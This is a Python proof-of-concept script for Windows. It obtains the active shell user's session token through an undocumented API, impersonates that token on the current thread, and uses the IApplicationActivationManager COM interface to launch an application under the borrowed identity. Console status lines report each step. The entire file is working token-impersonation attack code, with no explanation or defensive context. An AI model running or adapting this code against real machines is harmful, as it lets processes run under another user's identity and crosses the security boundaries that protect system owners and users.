import ctypes
from ctypes import wintypes
import comtypes
from comtypes import GUID, COMMETHOD, IUnknown

ole32 = ctypes.oledll.ole32
advapi32 = ctypes.WinDLL("advapi32.dll")
usertok = ctypes.WinDLL("ext-ms-win-session-usertoken-l1-1-0.dll")

# 1. Get Shell Token (UserMgr2 / SID 1004)
p_shell_tok = getattr(usertok, "UMgrGetSessionActiveShellUserToken")
p_shell_tok.argtypes = [wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
p_shell_tok.restype = ctypes.c_long
hToken = wintypes.HANDLE()
hr = p_shell_tok(0, ctypes.byref(hToken))
print(f"[+] Got UserMgr2 token: 0x{hToken.value:X}")

# 2. Impersonate
advapi32.ImpersonateLoggedOnUser(hToken)
print("[+] Impersonated UserMgr2 on thread")

# 3. CoInitializeEx
ole32.CoInitializeEx(None, 0) # COINIT_MULTITHREADED

CLSID_ApplicationActivationManager = GUID("{45BA127D-10A5-464E-8AB0-E44F33900787}")
IID_IApplicationActivationManager = GUID("{2e941141-7f97-4756-ba1d-9decde894a3d}")

class IApplicationActivationManager(IUnknown):
    _iid_ = IID_IApplicationActivationManager
    _methods_ = [
        COMMETHOD([], ctypes.c_long, "ActivateApplication",
                  (["in"], wintypes.LPCWSTR, "appUserModelId"),
                  (["in"], wintypes.LPCWSTR, "arguments"),
                  (["in"], ctypes.c_uint, "options"),
                  (["out"], ctypes.POINTER(wintypes.DWORD), "processId")),
        COMMETHOD([], ctypes.c_long, "ActivateForFile",
                  (["in"], wintypes.LPCWSTR, "appUserModelId"),
                  (["in"], ctypes.c_void_p, "itemArray"),
                  (["in"], wintypes.LPCWSTR, "verb"),
                  (["out"], ctypes.POINTER(wintypes.DWORD), "processId")),
        COMMETHOD([], ctypes.c_long, "ActivateForProtocol",
                  (["in"], wintypes.LPCWSTR, "appUserModelId"),
                  (["in"], ctypes.c_void_p, "itemArray"),
                  (["out"], ctypes.POINTER(wintypes.DWORD), "processId")),
    ]

try:
    mgr = comtypes.CoCreateInstance(
        CLSID_ApplicationActivationManager,
        interface=IApplicationActivationManager,
        clsctx=comtypes.CLSCTX_LOCAL_SERVER
    )
    print(f"[+] CoCreateInstance IApplicationActivationManager SUCCESS: {mgr}")
    pid = wintypes.DWORD()
    aumid = "c5e2524a-ea46-4f67-841f-6a9465d9d515!App"
    hr = mgr.ActivateApplication(aumid, None, 0, ctypes.byref(pid))
    print(f"[+] ActivateApplication({aumid}): hr=0x{hr & 0xFFFFFFFF:08X}, PID={pid.value}")
except Exception as e:
    print(f"[-] Activation failed: {e}")

